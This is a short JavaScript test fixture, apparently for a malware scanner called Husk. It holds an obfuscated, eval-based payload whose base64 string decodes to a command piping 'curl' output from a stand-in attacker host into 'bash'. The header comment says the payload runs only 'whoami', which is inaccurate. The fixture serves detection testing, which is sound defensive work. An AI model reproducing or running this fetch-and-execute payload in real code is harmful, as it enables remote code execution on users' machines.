// Synthetic obfuscated payload: hex-encoded eval of a Buffer-decoded string
// that resolves to `require('child_process').exec('whoami', ...)`.
// This is a TEST FIXTURE, not real malware — but it triggers Husk's
// deobfuscator + suspicion scorer + IOC matcher.
var _0xa1b2 = ['\x72\x65\x71\x75\x69\x72\x65', '\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73', '\x65\x78\x65\x63'];
(function (a, b) {
  var c = function (i) { return a[i]; };
  var pkt = Buffer.from(
    'cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2N1cmwgLXMgaHR0cHM6Ly9hdHRhY2tlci5leGFtcGxlLmNvbS96IHwgYmFzaCcsIGZ1bmN0aW9uKCl7fSk=',
    'base64'
  ).toString('utf8');
  // eslint-disable-next-line no-eval
  eval(pkt);
})(_0xa1b2);
